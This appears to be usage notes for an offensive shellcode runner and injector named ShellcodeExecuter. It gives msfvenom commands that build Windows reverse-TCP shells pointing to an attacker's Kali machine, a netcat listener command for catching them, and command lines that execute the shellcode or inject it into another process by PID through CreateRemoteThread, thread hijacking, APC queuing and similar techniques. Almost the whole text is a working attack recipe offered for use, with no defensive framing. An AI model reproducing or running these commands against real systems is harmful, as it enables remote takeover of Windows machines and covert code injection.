
Generate Shellcode:
For x32: msfvenom -p windows/shell_reverse_tcp LHOST=[kali-machine-ip] LPORT=[port-number] -f raw > shell32.bin
For x64: msfvenom -p windows/x64/shell_reverse_tcp LHOST=[kali-machine-ip] LPORT=[port-number] -f raw > shell64.bin

Setup Listener: netcat -nlvp [port-number]

Execute Shellcode:
For x32: ShellcodeExecuter32 [Technique] [path/to/raw/shell32]
For x64: ShellcodeExecuter64 [Technique] [path/to/raw/shell64]

Execution Technique:
    1 (FunctionPointer)
    2 (CreateThread)
    3 (CreateFiber)
    4 (CreateThreadpool)
    5 (QueueUserAPC)

Inject Shellcode:
For x32: ShellcodeExecuter32 [Technique] [x32-PID] [path/to/raw/shell32]
For x64: ShellcodeExecuter64 [Technique] [x64-PID] [path/to/raw/shell64]

Injection Technique:
    1 (InjectNewEntryPoint, PID=0)
    2 (CreateRemoteThread)
    3 (HijackRemoteThread)